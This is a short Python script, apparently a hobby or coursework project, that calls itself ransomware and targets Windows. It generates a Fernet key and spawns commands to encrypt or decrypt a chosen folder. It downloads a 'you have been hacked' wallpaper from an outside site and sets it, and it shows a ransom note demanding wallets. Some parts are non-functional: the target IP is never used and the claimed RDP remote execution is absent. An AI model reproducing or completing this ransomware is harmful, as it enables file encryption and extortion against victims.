# Sierra Maldonado
#!/usr/bin/env python3
import os
import datetime
import urllib.request
import subprocess
import win32api
import win32con
import win32ts
from cryptography.fernet import Fernet
from menu import Menu, MenuItem

# Functions to write key and load key
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()


class Ransomware:
    def __init__(self):
        self.sysRoot = os.path.expanduser('~')
        if not os.path.exists("key.key"):
            write_key()
        self.key = load_key()

    # Encrypt all files in a folder on a different VM using RDP
    def encrypt_folder_on_vm(self, target_vm_ip, folder_path):
        user_token = win32ts.WTSQueryUserToken(win32ts.WTSGetActiveConsoleSessionId())
        command = f'python ransomware.py encrypt "{folder_path}"'
        win32api.CreateProcessAsUser(user_token, None, command, None, None, True, win32con.NORMAL_PRIORITY_CLASS, None, None, win32api.STARTUPINFO())

    # Decrypt files using the Fernet symmetric key
    def decrypt_folder_on_vm(self, target_vm_ip, folder_path):
        user_token = win32ts.WTSQueryUserToken(win32ts.WTSGetActiveConsoleSessionId())
        command = f'python ransomware.py decrypt "{folder_path}"'
        win32api.CreateProcessAsUser(user_token, None, command, None, None, True, win32con.NORMAL_PRIORITY_CLASS, None, None, win32api.STARTUPINFO())

    # Change Desktop Background on Windows using RDP
    def change_background(self):
        image_url = "https://www.unigamesity.com/wp-content/uploads/2009/05/you-have-been-hacked.jpg"
        path = "C:\\path\\to\\wallpaper.jpg"  # Update the path accordingly
        urllib.request.urlretrieve(image_url, path)
        win32api.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, 0, path, win32con.SPIF_UPDATEINIFILE)

    # Display Ransom Note as Popup on Windows using RDP
    def ransom_note(self):
        ransom_note_text = "You have been bamboozled by the Black Fox Bandits. Please hand over your wallets."
        win32api.MessageBox(0, ransom_note_text, "Ransom Note", win32con.MB_OK)

    def attack_windows_server(self):
        target_ip = input("Enter the target IP address: ")
        
        # Create menu items
        encrypt_item = MenuItem("Encrypt", lambda: self.encrypt_folder_on_vm(target_ip, input("Enter the folder path to encrypt: ")))
        popup_item = MenuItem("Pop-up", self.ransom_note)
        background_item = MenuItem("Background", self.change_background)
        decrypt_item = MenuItem("Decrypt", lambda: self.decrypt_folder_on_vm(target_ip, input("Enter the folder path to decrypt: ")))
        exit_item = MenuItem("Exit", exit)

        # Create menu
        menu = Menu([encrypt_item, popup_item, background_item, decrypt_item, exit_item])
        menu.show()

ransomware = Ransomware()
ransomware.attack_windows_server()

